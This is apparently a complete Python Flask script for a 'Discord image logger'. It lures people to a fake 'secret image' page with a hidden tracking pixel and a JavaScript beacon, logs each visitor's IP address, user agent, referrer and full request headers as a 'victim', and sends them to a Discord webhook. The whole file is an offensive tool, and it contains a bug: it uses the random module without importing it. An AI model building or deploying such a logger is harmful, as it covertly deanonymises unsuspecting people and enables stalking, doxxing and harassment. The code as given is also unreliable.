from flask import Flask, request, render_template_string
import requests
import json
from datetime import datetime

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_HERE"

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Image Viewer</title>
    <style>
        body { background: #000; color: #fff; text-align: center; font-family: Arial; }
        img { max-width: 90%; border: 3px solid #ff0000; }
        .info { background: #333; padding: 20px; margin: 20px; border-radius: 10px; }
    </style>
</head>
<body>
    <h1>🔥 Secret Image Revealed!</h1>
    <div class="info">
        <p><strong>Status:</strong> {{status}}</p>
        <p><strong>Time:</strong> {{time}}</p>
        <p><strong>User ID:</strong> {{user_id}}</p>
    </div>
    <img src="https://picsum.photos/800/600?random={{random}}" alt="Secret">
    
    <!-- 1x1 Tracking Pixel (unsichtbar) -->
    <img src="/track_pixel/{{user_id}}" width="1" height="1" style="display:none;">
    
    <script>
        // JavaScript IP Logger
        fetch('/js_track/{{user_id}}', {method: 'POST'})
        .then(() => console.log('Tracked!'));
    </script>
</body>
</html>
"""

@app.route('/track/<user_id>/<track_id>')
def track_image(user_id, track_id):
    """Haupt Tracking Endpoint"""
    user_agent = request.headers.get('User-Agent', 'Unknown')
    ip = request.remote_addr
    referrer = request.referrer or 'Direct'
    
    # Vollständige Victim Info
    victim_data = {
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "user_id": user_id,
        "track_id": track_id,
        "ip": ip,
        "user_agent": user_agent[:100],
        "referrer": referrer,
        "headers": dict(request.headers)
    }
    
    # An Discord Webhook senden
    requests.post(
        WEBHOOK_URL,
        json={
            "embeds": [{
                "title": f"🎣 Victim Caught! [{user_id}]",
                "description": f"`IP:` **{ip}**\n`UA:` {user_agent[:80]}...\n`Track ID:` {track_id}",
                "color": 0x00ff00,
                "fields": [
                    {"name": "Referrer", "value": referrer or "Direct", "inline": True},
                    {"name": "Timestamp", "value": victim_data["timestamp"], "inline": True}
                ],
                "footer": {"text": "Discord Image Logger"}
            }]
        }
    )
    
    print(f"[+] TRACKED: {ip} -> {user_id}")
    
    return render_template_string(HTML_TEMPLATE, 
                                status="✅ TRACKED", 
                                time=datetime.now().strftime("%H:%M:%S"),
                                user_id=user_id,
                                random=''.join(random.choices('abc123', k=8)))

@app.route('/track_pixel/<user_id>')
def track_pixel(user_id):
    """Unsichtbarer 1x1 Pixel Tracker"""
    ip = request.remote_addr
    requests.post(WEBHOOK_URL, json={"content": f"🖼️ Pixel Track: {ip} ({user_id})"})
    return "", 204

@app.route('/js_track/<user_id>', methods=['POST'])
def js_track(user_id):
    """JavaScript Fingerprint Tracker"""
    ip = request.remote_addr
    requests.post(WEBHOOK_URL, json={"content": f"📱 JS Track: {ip} ({user_id})"})
    return "", 200

if __name__ == "__main__":
    print("[+] Logger Server starting on :5000")
    app.run(host='0.0.0.0', port=5000, debug=False)
